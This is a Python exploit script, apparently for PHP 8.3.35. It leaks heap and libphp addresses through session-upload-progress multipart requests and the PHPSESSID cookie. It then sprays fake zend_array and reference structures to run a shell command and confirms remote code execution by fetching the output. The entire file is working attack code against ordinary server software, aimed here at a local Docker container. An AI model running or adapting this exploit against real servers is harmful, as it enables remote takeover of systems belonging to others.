#!/usr/bin/env python3
"""8.3.35 stage-3 via 9bie's spray approach.

Uses our stage1+stage2 (which work on 8.3.35) + 9bie's B2 fake-ref spray
(500+495 fields of 384B values, fake ref every 32B) to cover a wide range
and hit PS(http_session_vars) regardless of exact heap position.
"""
import subprocess, sys, os, time, struct, socket, argparse

BASE = os.path.dirname(os.path.abspath(__file__))
PORT = 18112
CONTAINER = "p2s8335"
ZIF_OFFSET = 0x3ac080
DTOR_OFFSET = 0x49ec50
HTDATA_OFFSET = 0x690d8
CMD = "id>/www/p1"
FETCH = "/p1"

def log(msg): print(msg, flush=True)

def rotate(port):
    """Kill worker via OOM abort."""
    # Send a big request that triggers OOM and kills the worker
    parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (256 * 1024 * 1024)},
    ]
    body = build_multipart(parts, b"S" * 17)
    send_raw(port, body, b"S" * 17, timeout=120)
    time.sleep(0.5)
    # Second request to finalize the kill
    parts2 = [
        {"name": "PHPSESSID", "data": b"attacksessionid0001"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    body2 = build_multipart(parts2, b"BNDRY12345")
    send_raw(port, body2, b"BNDRY12345", timeout=30)
    time.sleep(0.5)

def build_multipart(parts, boundary):
    out = bytearray()
    for p in parts:
        name = p["name"].encode() if isinstance(p["name"], str) else p["name"]
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + name + b'"'
        if p.get("filename"):
            out += b'; filename="' + p["filename"].encode() + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + p["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)

def send_raw(port, body, boundary, timeout=60, path="/"):
    req = (f"POST {path} HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n"
           f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode()
    resp = bytearray()
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=timeout)
        s.settimeout(timeout)
        s.sendall(req + body)
        while len(resp) < (9 << 20):
            chunk = s.recv(65536)
            if not chunk:
                break
            resp.extend(chunk)
    except (OSError, ConnectionError):
        pass
    finally:
        try: s.close()
        except: pass
    return bytes(resp)

def stage1(port):
    """Leak chunk base."""
    # A request: 1001 small fields + OOM
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (256 * 1024 * 1024)},
    ]
    body = build_multipart(parts, b"S" * 17)
    send_raw(port, body, b"S" * 17, timeout=120)
    time.sleep(0.2)

    # B request: leak via Set-Cookie
    parts = [
        {"name": "PHPSESSID", "data": b"attacksessionid0001"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(841):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    body = build_multipart(parts, b"B" * 10)
    resp = send_raw(port, body, b"B" * 10, timeout=60)
    return parse_chunk_base(resp)

def stage2(port):
    """Leak libphp base."""
    # A request: 1001 × 39B fields + OOM
    parts = [{"name": f"f{i:04d}"[:5], "data": b"x" * 39} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (256 * 1024 * 1024)},
    ]
    body = build_multipart(parts, b"S" * 17)
    send_raw(port, body, b"S" * 17, timeout=120)
    time.sleep(0.2)

    # B request: 983 fields, one with 16 sub-fields
    parts = [
        {"name": "PHPSESSID", "data": b"attacksessionid0001"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(983):
        cnt = 16 if i == 406 else 1
        for j in range(cnt):
            parts.append({"name": f"a{i:04d}[{j}]", "data": b"x" * 16})
    body = build_multipart(parts, b"B" * 10)
    resp = send_raw(port, body, b"B" * 10, timeout=60)
    return parse_libphp_base(resp, DTOR_OFFSET)

def parse_chunk_base(resp):
    import re
    from collections import Counter
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    if not m:
        return 0
    import urllib.parse
    raw = urllib.parse.unquote_to_bytes(m.group(1).decode("latin1"))
    if len(raw) < 1000:
        return 0
    c = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i+8], "little")
        if 0x7F0000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    if not c:
        return 0
    base, count = c.most_common(1)[0]
    return base if count >= 8 else 0

def parse_libphp_base(resp, dtor_offset):
    import re
    import urllib.parse
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    if not m:
        return 0
    raw = urllib.parse.unquote_to_bytes(m.group(1).decode("latin1"))
    if len(raw) < 16:
        return 0
    p = int.from_bytes(raw[8:16], "little")
    if not (0x7F0000000000 <= p < 0x800000000000):
        return 0
    if p & 0xFFF != dtor_offset & 0xFFF:
        return 0
    base = p - dtor_offset
    return base if base & 0xFFF == 0 else 0

def stage3_spray(port, htdata, zif, s_offset=0xF8398):
    """9bie's B2 spray: 500+495 fields of 384B with fake ref every 32B."""
    S = htdata  # fake zend_array address = htdata (our live 167B string)
    
    # Build fake zend_array (167 bytes)
    ht = bytearray(b"\x00" * 167)
    struct.pack_into("<II", ht, 0x00, 1, 7)
    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
    struct.pack_into("<Q", ht, 0x10, htdata + 0x20)
    struct.pack_into("<II", ht, 0x18, 1, 1)
    struct.pack_into("<II", ht, 0x20, 8, 0)
    struct.pack_into("<Q", ht, 0x28, 0)
    struct.pack_into("<Q", ht, 0x30, zif)
    E = 0x20
    struct.pack_into("<Q", ht, E+0x00, 0)
    struct.pack_into("<Q", ht, E+0x08, 0)
    struct.pack_into("<Q", ht, E+0x10, zif)
    struct.pack_into("<Q", ht, E+0x18, 0)
    struct.pack_into("<Q", ht, E+0x20, 0)
    struct.pack_into("<I", ht, E+0x28, 0)
    struct.pack_into("<I", ht, E+0x2C, 1)
    struct.pack_into("<Q", ht, E+0x30, 0)
    struct.pack_into("<Q", ht, E+0x38, 0)
    struct.pack_into("<I", ht, E+0x40, 0)
    struct.pack_into("<Q", ht, E+0x50, htdata + 0x80)
    struct.pack_into("<I", ht, E+0x58, 6)
    struct.pack_into("<II", ht, 0x80, 1, 0x106)
    struct.pack_into("<Q", ht, 0x88, 0)
    struct.pack_into("<Q", ht, 0x90, len(CMD))
    ht[0x98:0x98+len(CMD)] = CMD.encode()
    ht[0x98+len(CMD)] = 0
    ht = bytes(ht)

    # Build spray value: 384 bytes with fake ref every 32B
    VL = 384
    def fake_ref():
        rv = bytearray(32)
        struct.pack_into("<I", rv, 0, 1)  # rc=1
        rv[4] = 0x0A  # IS_REFERENCE
        struct.pack_into("<Q", rv, 8, S)  # ptr = fake array
        struct.pack_into("<I", rv, 16, 0x0107)  # val.type
        return bytes(rv)
    
    spray = bytearray(b"S" * VL)
    o = 8
    while o + 32 <= VL:
        spray[o:o+32] = fake_ref()
        o += 32
    spray = bytes(spray)

    # Build request body
    boundary = b"C" * 10
    def part(name, value):
        return (b"--" + boundary + b"\r\n"
                b'Content-Disposition: form-data; name="' + name + b'"\r\n\r\n'
                + value + b"\r\n")
    
    body = bytearray()
    # n1: 500 spray fields before ht
    for i in range(500):
        name = (b"s" + ("%09d" % i).encode() + b"x" * 10)[:10]
        body += part(name, spray)
    # ht field
    body += part(b"ht", ht)
    # PHPSESSID + progress
    body += part(b"PHPSESSID", b"a" * 32)
    body += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    # n2: 495 spray fields after
    for i in range(495):
        name = (b"t" + ("%09d" % i).encode() + b"x" * 10)[:10]
        body += part(name, spray)
    body += b"--" + boundary + b"--\r\n"
    body = bytes(body)

    log(f"[*] B2 spray: {len(body)} bytes, S=0x{S:x}, zif=0x{zif:x}")
    send_raw(port, body, boundary, timeout=60)

def main():
    log(f"[*] 8.3.35 spray approach")
    log(f"[*] Container: {CONTAINER}  Port: {PORT}")
    
    # Restart container for clean state
    subprocess.run(["docker", "restart", CONTAINER], capture_output=True, timeout=30)
    time.sleep(2)
    
    # Stage 1: chunk base
    log("[*] Stage 1: chunk base leak")
    rotate(PORT)
    chunk = stage1(PORT)
    if not chunk:
        log("[-] Stage 1 failed")
        return 1
    log(f"[+] chunk base = 0x{chunk:x}")
    
    # Stage 2: libphp base
    log("[*] Stage 2: libphp base leak")
    rotate(PORT)
    libphp = stage2(PORT)
    if not libphp:
        log("[-] Stage 2 failed")
        return 1
    log(f"[+] libphp base = 0x{libphp:x}")
    
    # Stage 3: spray
    htdata = chunk + HTDATA_OFFSET
    zif = libphp + ZIF_OFFSET
    log(f"[*] Stage 3: htdata=0x{htdata:x} zif=0x{zif:x}")
    
    rotate(PORT)
    stage3_spray(PORT, htdata, zif)
    time.sleep(1)
    
    # Check for proof
    try:
        status, body = get_proof(PORT)
        if status == 200 and b"uid=" in body:
            log(f"[+] RCE PROVEN! {body.decode('latin1').strip()}")
            return 0
    except:
        pass
    
    log("[-] No proof found")
    return 1

def get_proof(port):
    req = f"GET {FETCH} HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\nConnection: close\r\n\r\n".encode()
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=10)
        s.settimeout(10)
        s.sendall(req)
        data = b""
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            data += chunk
        s.close()
        head, _, body = data.partition(b"\r\n\r\n")
        m = __import__("re").match(rb"HTTP/1\.[01] (\d{3})", head)
        return (int(m.group(1)) if m else 0), body
    except:
        return 0, b""

if __name__ == "__main__":
    sys.exit(main())
